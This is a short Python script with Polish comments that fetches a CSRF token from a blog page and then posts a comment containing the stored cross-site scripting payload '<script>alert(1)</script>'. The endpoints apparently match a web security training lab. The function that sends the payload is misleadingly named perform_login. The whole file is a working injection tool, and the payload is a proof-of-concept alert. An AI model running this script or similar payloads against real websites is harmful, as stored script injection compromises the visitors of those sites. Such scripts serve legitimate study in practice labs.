import requests
import re
import sys

def get_csrf_token(session, url):
    response = session.get(url + "/post?postId=9")
    if response.status_code == 200:
        # Znajdź wartość CSRF tokena w treści odpowiedzi
        match = re.search(r'name="csrf" value="(.*?)">', response.text)
        if match:
            return match.group(1)
        else:
            raise ValueError("Nie znaleziono CSRF tokena.")
    else:
        raise ConnectionError(f"Błąd podczas wysyłania żądania GET: {response.status_code}")

def perform_login(session, url, csrf_token):
    payload = {
        'csrf': csrf_token,
        'postId': "1",
        'comment': '<script>alert(1)</script>',
        'name': '1',
        'email': '1@a.com',
        'website': ''
    }
    response = session.post(url + "/post/comment", data=payload)
    return response

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Użycie: python script.py <URL>")
        sys.exit(1)
    
    url = sys.argv[1]
    
    session = requests.Session()
    
    try:
        csrf_token = get_csrf_token(session, url)
        print(f"Pobrany CSRF token: {csrf_token}")
        
        response = perform_login(session, url, csrf_token)
        print(f"Status odpowiedzi POST: {response.status_code}")
#        print(f"Treść odpowiedzi POST: {response.text}")
        
    except Exception as e:
        print(f"Wystąpił błąd: {e}")
